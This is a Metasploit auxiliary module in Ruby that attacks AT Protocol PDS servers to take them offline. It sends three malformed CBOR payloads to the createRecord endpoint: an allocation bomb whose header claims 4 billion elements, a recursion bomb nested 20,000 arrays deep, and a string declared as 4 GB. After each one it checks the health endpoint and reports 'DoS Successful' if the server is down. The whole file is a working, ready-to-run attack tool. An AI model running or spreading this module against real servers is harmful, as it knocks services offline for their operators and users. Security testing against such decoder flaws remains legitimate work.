##
# This module requires Metasploit: https://metasploit.com/download
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'AT Protocol CBOR Denial of Service',
      'Description'    => %q{
        This module exploits vulnerabilities in CBOR decoders used by AT Protocol PDS servers.
        It implements two attacks:
        1. Allocation Bomb: Sends a CBOR array/map claiming to have 4 billion elements,
           triggering OOM if the server pre-allocates memory.
        2. Recursion Bomb: Sends a deeply nested CBOR structure (array of arrays) to
           trigger a stack overflow.
        3. Large String Bomb: Sends a CBOR string with a declared length of 4GB but
           minimal data, testing memory allocation and length validation.
      },
      'Author'         => ['OpenCode'],
      'License'        => MSF_LICENSE
    ))

    register_options([
      Opt::RPORT(8080),
      OptString.new('TARGETURI', [true, 'The base path to the PDS', '/']),
      OptInt.new('RECURSION_DEPTH', [true, 'Depth for recursion attack', 20000])
    ])
  end

  def run
    if check_health
      print_good("Target is up. Starting attacks...")
    else
      print_error("Target seems down or unreachable.")
      return
    end

    attack_allocation_bomb
    
    if check_health
      print_good("Target survived Allocation Bomb.")
    else
      print_good("Target DOWN after Allocation Bomb! (DoS Successful)")
      return
    end

    attack_recursion_bomb

    if check_health
      print_good("Target survived Recursion Bomb.")
    else
      print_good("Target DOWN after Recursion Bomb! (DoS Successful)")
      return
    end

    attack_large_string_bomb

    if check_health
      print_good("Target survived Large String Bomb.")
    else
      print_good("Target DOWN after Large String Bomb! (DoS Successful)")
    end
  end

  def check_health
    begin
      res = send_request_cgi({
        'method' => 'GET',
        'uri'    => normalize_uri(target_uri.path, 'health'),
        'read_max_length' => 1024
      }, 5) # Short timeout
      return res && res.code == 200
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      return false
    end
  end

  def attack_allocation_bomb
    print_status("Sending Allocation Bomb (Array with 4B elements)...")
    # 0x9B = Array(8-byte count)
    # 0xFFFFFFFF = 4294967295 elements
    payload = "\x9B" + [0xFFFFFFFF].pack('Q>')
    
    send_payload(payload)
  end

  def attack_recursion_bomb
    depth = datastore['RECURSION_DEPTH']
    print_status("Sending Recursion Bomb (Depth: #{depth})...")
    
    # Nested arrays: [ [ [ ... ] ] ]
    # 0x81 = Array(1)
    payload = ("\x81" * depth) + "\x01" # Innermost integer 1
    
    send_payload(payload)
  end

  def attack_large_string_bomb
    print_status("Sending Large String Bomb (Declared: 4GB, Actual: 10 bytes)...")
    # 0x7B = String(8-byte count)
    # 0xFFFFFFFF = 4294967295 bytes
    payload = "\x7B" + [0xFFFFFFFF].pack('Q>') + "A" * 10
    
    send_payload(payload)
  end

  def send_payload(data)
    begin
      # We use com.atproto.repo.createRecord as it expects a CBOR body
      send_request_cgi({
        'method' => 'POST',
        'uri'    => normalize_uri(target_uri.path, 'xrpc', 'com.atproto.repo.createRecord'),
        'ctype'  => 'application/cbor',
        'data'   => data
      }, 2) # Short timeout, we expect crash or hang
    rescue ::Exception
      # Ignore errors during attack transmission
    end
  end
end
